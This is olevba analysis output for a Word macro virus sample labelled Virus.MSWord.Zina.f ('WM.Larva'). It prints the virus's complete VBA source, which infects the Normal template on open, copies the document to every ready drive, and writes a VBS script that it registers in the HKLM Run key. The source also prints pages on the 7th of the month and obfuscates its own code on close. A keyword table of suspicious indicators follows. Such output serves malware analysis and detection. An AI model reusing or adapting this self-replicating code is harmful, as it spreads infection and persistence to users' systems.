olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zina.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zina.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): On Error Resume Next: Application.ScreenUpdating = False
If ThisDocument = ActiveDocument Then Set vx = NormalTemplate Else Set vx = ActiveDocument
With vx.VBProject.VBComponents(1).CodeModule
 najdi = .Lines(70, 1)
 virus = Strings.Trim(ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, _
 ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines))
  If nadji <> "'Larva" Then
   .deletelines 1, .CountOfLines
   .addfromstring virus
  End If
End With
Set fs = CreateObject("Scripting.FileSystemObject")
Set drajvovi = fs.drives
 For Each D In drajvovi
  If D.isready Then
   fs.copyfile ActiveDocument.FullName, D.driveletter & ":\", True
  End If
 Next
Open "c:\Win32.vbs" For Output As #1
 Print #1, "for a = 1 to 10"
  Print #1, "Msgbox ""...Kad sve izgleda umire, ono se ustvari radja"",vbSystemModal,""..."""
 Print #1, "next"
Close #1
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "K32Set") = "c:\Win32.vbs"
If Day(Now()) = 7 Then
 Documents.Add
  With Selection
   .Text = "KAD SVE IZGLEDA DA UMIRE, ONO SE USTVARI RADJA" _
         & "   WM.Larva by Specie [Species Virus Labs]    " _
         & "                   2 0 0 1                    "
   .BoldRun
   .Shading.BackgroundPatternColor = wdColorBlack
   .Shading.ForegroundPatternColor = wdColorViolet
   .Collapse Direction:=wdCollapseStart
  End With
ActiveDocument.ActiveWindow.PrintOut _
Range:=wdPrintFromTo, From:="1", To:="10"
End If
Application.ScreenUpdating = True
End Sub
Private Sub document_close(): On Error Resume Next
For kd = 2 To 39
 okod = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(kd, 1)
 If Left(okod, 1) = "'" Then
  desni = Right(okod, Len(okod) - 1)
  ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine kd, desni
  For s = 1 To Len(desni)
   vracaj = vracaj & Chr(Asc(Mid(desni, s)) - 5)
   ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine kd, vracaj
  Next
  vracaj = ""
 End If
Next
Document_Open
For T = 2 To 39
 nkod = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(T, 1)
 If Left(nkod, 1) <> "'" Then
  duzina = Len(nkod)
  midl = Mid(nkod, 1, duzina)
  For o = 1 To duzina
   k = Left(midl, o)
   k2 = Chr(Asc(Mid(k, Len(k))) + 5)
   linija = linija & k2
   ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine T, "'" & linija
  Next
  linija = ""
 End If
Next
End Sub
'Larva

















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|copyfile            |May copy a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Win32.vbs           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

